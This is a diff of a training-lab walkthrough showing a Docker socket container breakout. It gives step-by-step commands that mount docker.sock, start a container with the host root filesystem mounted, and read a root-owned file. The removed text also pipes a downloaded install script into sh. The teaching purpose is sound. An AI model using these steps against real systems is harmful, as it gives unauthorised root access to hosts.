@@ -1,220 +1,130 @@
 ## Docker Daemon Direct Access
 
-###### A malicious user who gains access to a container where the `docker.sock` of host machine is exposed, can gain access to the host machine.
+###### A malicious user who gains access to `docker.sock` of host machine can gain `root` access to the host machine.
+
+###### Docker-Socket is responsible for communication with the Docker Service. When the docker-socket is mounted on-to a container, docker containers can be launched from the running container via. the socket causing `container breakout`
 
 ##### Step 1:
 
 * Open Terminal
 
-	![](img/Open-Terminal.png)
+![](img/Open-Terminal.png)
 
-##### Step 2:
 
-*  **cd** into  `/home/we45/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access`
+##### Step 2: 
+  
+* Run `sudo su we45` to login as a normal user.
 
-    ```commandline
-    cd /home/we45/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access
-    ```
-##### Step 3:
+```commandline
+root@we45:~# sudo su we45
+we45@we45:~$
+```
 
-* Run `docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name vul_flask abhaybhargav/vul_flask` to start a docker container.
+##### Step 3: 
+    
+* Launch a container by mounting the `docker.sock` which can be found in `/var/run` .
 
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access# docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name vul_flask abhaybhargav/vul_flask
-    1681e86d567eaa2b7344cff0535819fffe8f3a786b4b768be3c95d9b40a4e71d
-    ```
-      
-    ![](img/docker-run.png)
+
+```commandline
+docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name helloworld helloworld
+```
+
  
 ##### Step 4:   
 
-* Run `docker ps` to view, all running containers.
+* View all running containers.
 
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access# docker ps
-    CONTAINER ID        IMAGE                    COMMAND             CREATED              STATUS              PORTS               NAMES
-    1681e86d567e        abhaybhargav/vul_flask   "python app.py"     About a minute ago   Up About a minute   5050/tcp            vul_flask/tcp            vul_flask
-    ```
-     
-    ![](img/docker-ps.png)
+```commandline
+docker ps
+```
+
+```commandline
+we45@we45:~$ docker ps
+CONTAINER ID        IMAGE                    COMMAND             CREATED              STATUS              PORTS               NAMES
+1681e86d567e        helloworld:latest   "python app.py"     About a minute ago   Up About a minute   5050/tcp            helloworld/tcp            helloworld
+```
     
 ##### Step 5:   
 
-* Run `docker exec -it vul_flask bash` to exec into a running container.
+* Run `docker exec -it helloworld /bin/bash` to exec into a running container.
 
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access# docker exec -it vul_flask bash
-    root@1681e86d567e:/apps# 
-    ```
-    ![](img/docker-exec.png)
+```commandline
+we45@we45:~$ docker exec -it helloworld bash
+root@1681e86d567e:/apps# 
+```
 
 ##### Step 6:
 
-* Install docker-engine by running `apt-get update && apt-get install wget -y && wget -qO- https://get.docker.com | sh`
+*  Inside the `helloworld` container, docker images and containers of the host machine can be accessed
 
-    ```commandline
-    root@1681e86d567e:/apps# apt-get update && apt-get install wget -y && wget -qO- https://get.docker.com | sh
-    Get:1 http://security.debian.org jessie/updates InRelease [44.9 kB]
-    Ign http://deb.debian.org jessie InRelease          
-    Get:2 http://deb.debian.org jessie-updates InRelease [145 kB]
-    Get:3 http://deb.debian.org jessie Release.gpg [2420 B]                               
-    Get:4 http://deb.debian.org jessie Release [148 kB]              
-    Get:5 http://deb.debian.org jessie-updates/main amd64 Packages [23.0 kB]          
-    Get:6 http://deb.debian.org jessie/main amd64 Packages [9098 kB]       
-    Get:7 http://security.debian.org jessie/updates/main amd64 Packages [663 kB]
-    Fetched 10.1 MB in 21s (480 kB/s)                                                                                                                            
-    Reading package lists... Done
-    Reading package lists... Done
-    Building dependency tree       
-    Reading state information... Done
-    The following packages will be upgraded:
-      wget
-    1 upgraded, 0 newly installed, 0 to remove and 66 not upgraded.
-    Need to get 496 kB of archives.
-    After this operation, 362 kB disk space will be freed.
-    Get:1 http://deb.debian.org/debian/ jessie/main wget amd64 1.16-1+deb8u5 [496 kB]
-    Fetched 496 kB in 1s (288 kB/s)
-    debconf: delaying package configuration, since apt-utils is not installed
-    (Reading database ... 21636 files and directories currently installed.)
-    Preparing to unpack .../wget_1.16-1+deb8u5_amd64.deb ...
-    Unpacking wget (1.16-1+deb8u5) over (1.16-1+deb8u4) ...
-    Setting up wget (1.16-1+deb8u5) ...
-    # Executing docker install script, commit: 36b78b2
-    + sh -c apt-get update -qq >/dev/null
-    + sh -c apt-get install -y -qq apt-transport-https ca-certificates curl >/dev/null
-    debconf: delaying package configuration, since apt-utils is not installed
-    + sh -c curl -fsSL "https://download.docker.com/linux/debian/gpg" | apt-key add -qq - >/dev/null
-    + sh -c echo "deb [arch=amd64] https://download.docker.com/linux/debian jessie edge" > /etc/apt/sources.list.d/docker.list
-    + [ debian = debian ]
-    + [ jessie = wheezy ]
-    + sh -c apt-get update -qq >/dev/null
-    + sh -c apt-get install -y -qq --no-install-recommends docker-ce >/dev/null
-    debconf: delaying package configuration, since apt-utils is not installed
-    + sh -c docker version
-    Client:
-     Version:           18.06.1-ce
-     API version:       1.38
-     Go version:        go1.10.3
-     Git commit:        e68fc7a
-     Built:             Tue Aug 21 17:25:03 2018
-     OS/Arch:           linux/amd64
-     Experimental:      false
-    
-    Server:
-     Engine:
-      Version:          18.06.1-ce
-      API version:      1.38 (minimum version 1.12)
-      Go version:       go1.10.3
-      Git commit:       e68fc7a
-      Built:            Tue Aug 21 17:23:24 2018
-      OS/Arch:          linux/amd64
-      Experimental:     false
-    If you would like to use Docker as a non-root user, you should now consider
-    adding your user to the "docker" group with something like:
-    
-      sudo usermod -aG docker your-user
-    
-    Remember that you will have to log out and back in for this to take effect!
-    
-    WARNING: Adding a user to the "docker" group will grant the ability to run
-             containers which can be used to obtain root privileges on the
-             docker host.
-             Refer to https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
-             for more information.
-    ```
+```commandline
+docker images
+```
 
-##### Step 7:
+```commandline
+docker ps
+```
 
-*  Once docker is installed, run `docker run -ti -v /:/hostFS/ ubuntu:16.04 /bin/bash`
+```commandline
+root@1681e86d567e:/apps# docker ps
+CONTAINER ID        IMAGE                    COMMAND             CREATED              STATUS              PORTS               NAMES
+1681e86d567e        helloworld:latest   "python app.py"     About a minute ago   Up About a minute   5050/tcp            helloworld/tcp            helloworld
+root@b412be8326b5:/apps#
+```
 
-    ```commandline
-    root@1681e86d567e:/apps# docker run -ti -v /:/hostFS/ ubuntu:16.04 /bin/bash
-    root@b412be8326b5:/#
-    ```
+##### Step 7
+
+* Launch another container from the `helloworld` container and mount the root-directory.
+
+```commandline
+docker run -ti -v /:/hostFS ubuntu:16.04 /bin/bash
+```
+
+```commandline
+root@1681e86d567e:/apps# docker run -ti -v /:/hostFS ubuntu:16.04 /bin/bash
+root@b412be8326b5:/#
+```
+
+###### Since `docker.sock` belongs to the host machine, when a container is launched the mounted root-directory belongs to the host-machine causing `container breakout`
 
 ##### Step 8:
 
-* Run `cd /hostFS/root/` to access the toot directory.
+* Run `cd /hostFS/root/` to access the mounted host directory. Run `ls` to check the secret.txt file inside a container.
 
-    ```commandline
-    root@b412be8326b5:/# cd /hostFS/root/    
-    ```
+```commandline
+/ # cd /hostFS/root/
+/hostFS/root # 
+/hostFS/root # ls
+secret.txt
+```
     
-##### Step 9:  
-
-* Run `ls` to check the secret.txt file inside a container.
-
-    ```commandline
-    root@b412be8326b5:/hostFS/root# ls
-    secret.txt
-    ``` 
-    
-##### Step 10:
+##### Step 9:
 
 * Run `cat secret.txt` to view the content of the file.
 
 ```commandline
-root@b412be8326b5:/hostFS/root# cat secret.txt 
+/hostFS/root # cat secret.txt
 secret
 ``` 
-**Note:** Malicious user now has complete access to the root Filesystem of the host machine.
-
-##### Step 11:
-
-* Run `exit` to exit from the Malicious container.
-
-    ```commandline
-    root@b412be8326b5:/hostFS/root# exit
-    exit
-    ```
-
-##### Step 12:
-
-* Run `exit` to exit from the container.
-
-    ```commandline
-    root@1681e86d567e:/apps# exit
-    exit
-    ```
-
-##### Step 13:  
- 
-* Run `docker stop vul_flask` to stop the running container.
-
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access# docker stop vul_flask
-    vul_flask
-    ```
-        
-    ![](img/docker-stop.png)  
     
-##### Step 14:   
+###### Note: Malicious user now has complete access to the root Filesystem of the host machine.
 
-* Run `docker rm vul_flask` to remove stopped container.
+##### Step 10:
 
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Docker-Daemon-Direct-Access# docker rm vul_flask
-    vul_flask
-    ```
-    ![](img/docker-rm.png)
-    
-##### Step 15:
+* Run `exit` multiple times to exit from the container(s).
 
-* Run `clean-docker` to stop all containers.  
+```commandline
+root@b412be8326b5:/hostFS/root# exit
+exit
+root@1681e86d567e:/apps# exit
+exit
+we45@we45:~$
+```
+    
+##### Stop all running docker containers
 
-    ```commandline
-    (venv)root@we45: clean-docker
-    92200af86b18
-    ca94dab2d52e
-    92200af86b18
-    34c4adcf326d
-    86cd73d03ef1
-    ca94dab2d52e
-    "docker rmi" requires at least 1 argument.
-    See 'docker rmi --help'.
-    
-    Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]
-    
-    Remove one or more images
-    
-    ``` 
+* Run `clean-docker` to stop all the containers
+
+```commandline
+root@we45:~$ clean-docker
+```
